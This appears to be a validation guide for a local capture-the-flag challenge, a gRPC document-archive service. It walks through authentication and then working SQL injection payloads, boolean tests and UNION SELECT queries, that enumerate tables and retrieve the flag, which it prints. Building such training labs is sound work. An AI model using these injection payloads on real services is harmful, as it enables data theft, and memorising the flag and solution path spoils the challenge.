# DuckRPC Archive — Validation and Testing

## 1. Clean Environment Validation
Before testing, stop any existing challenge containers:

```bash
docker compose down --remove-orphans
```

Start the challenge:

```bash
docker compose up --build -d
```

Confirm that the container is running:

```bash
docker compose ps
```

Expected result:

```text
chal-duckrpc-archive
```

The service should be running and exposed locally on:

```text
localhost:50051
```

---

## 2. gRPC Service Validation
List available services:

```bash
grpcurl -plaintext localhost:50051 list
```

Expected relevant services:

```text
duckrpc.ArchiveService
duckrpc.AuthService
grpc.health.v1.Health
grpc.reflection.v1alpha.ServerReflection
```

---

## 3. Authentication Validation
Enumerate the authentication service:

```bash
grpcurl -plaintext localhost:50051 list duckrpc.AuthService
```

Expected:

```text
duckrpc.AuthService.Login
```

Authenticate using:

```bash
grpcurl -plaintext \
-d "{\"username\":\"alice\",\"password\":\"AliceArchive2026!\"}" \
localhost:50051 \
duckrpc.AuthService/Login
```

Expected result:

```json
{
  "token": "<TOKEN>"
}
```

---

## 4. Authenticated Functionality Validation
Use the returned token:

```bash
grpcurl -plaintext \
-H "authorization: Bearer <TOKEN>" \
-d "{\"query\":\"\"}" \
localhost:50051 \
duckrpc.ArchiveService/SearchDocuments
```

Expected result:
Normal document records are returned.

---

## 5. Intended Vulnerability Validation
Test a false condition:

```bash
grpcurl -plaintext \
-H "authorization: Bearer <TOKEN>" \
-d "{\"query\":\"' AND 1=2 -- \"}" \
localhost:50051 \
duckrpc.ArchiveService/SearchDocuments
```

Expected result:
No matching document records are returned.

Test a true condition:

```bash
grpcurl -plaintext \
-H "authorization: Bearer <TOKEN>" \
-d "{\"query\":\"' AND 1=1 -- \"}" \
localhost:50051 \
duckrpc.ArchiveService/SearchDocuments
```

Expected result:
Document records are returned.

This confirms that the intended SQL injection behavior is reproducible.

---

## 6. Database Enumeration Validation
Run:

```bash
grpcurl -plaintext \
-H "authorization: Bearer <TOKEN>" \
-d "{\"query\":\"' UNION SELECT 1, name, 'x', 'x' FROM sqlite_master WHERE type='table' -- \"}" \
localhost:50051 \
duckrpc.ArchiveService/SearchDocuments
```

Expected relevant result:

```text
internal_records
```

---

## 7. Flag Retrieval Validation
Run:

```bash
grpcurl -plaintext \
-H "authorization: Bearer <TOKEN>" \
-d "{\"query\":\"' UNION SELECT id, record_name, 'internal', record_value FROM internal_records -- \"}" \
localhost:50051 \
duckrpc.ArchiveService/SearchDocuments
```

Expected result contains:

```text
duck{sqli_with_grpc_is_fantastic}
```

---

## 8. Reset Validation
Reset the environment:

```bash
docker compose down --remove-orphans
docker compose up --build -d
```

Repeat:
1. Service enumeration.
2. Authentication.
3. Authenticated document search.
4. Intended vulnerability validation.
5. Flag retrieval.

The challenge should behave consistently from the clean state.

---

## 9. Final Submission Checklist
* [ ] Challenge starts using the documented instructions.
* [ ] gRPC service is reachable on port 50051.
* [ ] Reflection is available.
* [ ] Authentication works.
* [ ] Authenticated search works.
* [ ] SQL injection is reproducible.
* [ ] Database enumeration works through the intended vulnerability.
* [ ] The flag is retrievable through the intended attack path.
* [ ] The challenge resets to a clean state.
* [ ] No REST functionality is exposed.
* [ ] No GraphQL functionality is exposed.
* [ ] No BOLA or IDOR vulnerability is intentionally included.
* [ ] README does not reveal the vulnerability.
* [ ] Official solution documents the intended attack path.
* [ ] Remediation addresses the SQL injection root cause.
* [ ] Validation is performed from a clean environment.